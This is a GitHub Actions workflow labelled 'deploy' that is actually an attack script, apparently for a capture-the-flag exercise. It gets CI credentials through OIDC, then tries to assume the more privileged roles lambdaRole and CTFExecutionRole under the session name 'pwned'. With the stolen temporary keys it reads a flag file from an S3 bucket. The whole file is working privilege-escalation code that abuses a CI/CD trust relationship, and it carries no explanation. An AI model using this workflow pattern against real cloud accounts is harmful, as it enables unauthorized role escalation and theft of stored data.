name: deploy
on:
  push:
    branches:
      - corgi
jobs:
  aws:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Get AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: AWS identity
        run: aws sts get-caller-identity

      - name: Try assuming privileged roles
        run: |
          echo "===== assume lambdaRole ====="
          aws sts assume-role \
            --role-arn arn:aws:iam::009661764077:role/lambdaRole \
            --role-session-name pwned || echo "lambdaRole: denied"
          echo "===== assume CTFExecutionRole ====="
          aws sts assume-role \
            --role-arn arn:aws:iam::009661764077:role/CTFExecutionRole \
            --role-session-name pwned || echo "CTFExecutionRole: denied"

      - name: If lambdaRole assumed - use its creds to read flag
        run: |
          CREDS=$(aws sts assume-role \
            --role-arn arn:aws:iam::009661764077:role/lambdaRole \
            --role-session-name pwned 2>/dev/null) || true
          if [ -n "$CREDS" ]; then
            export AWS_ACCESS_KEY_ID=$(echo $CREDS | python3 -c "import sys,json; print(json.load(sys.stdin)['Credentials']['AccessKeyId'])")
            export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | python3 -c "import sys,json; print(json.load(sys.stdin)['Credentials']['SecretAccessKey'])")
            export AWS_SESSION_TOKEN=$(echo $CREDS | python3 -c "import sys,json; print(json.load(sys.stdin)['Credentials']['SessionToken'])")
            echo "===== reading flag as lambdaRole ====="
            aws s3 cp s3://codec4f26c862a321ef5/flag.txt -
          fi
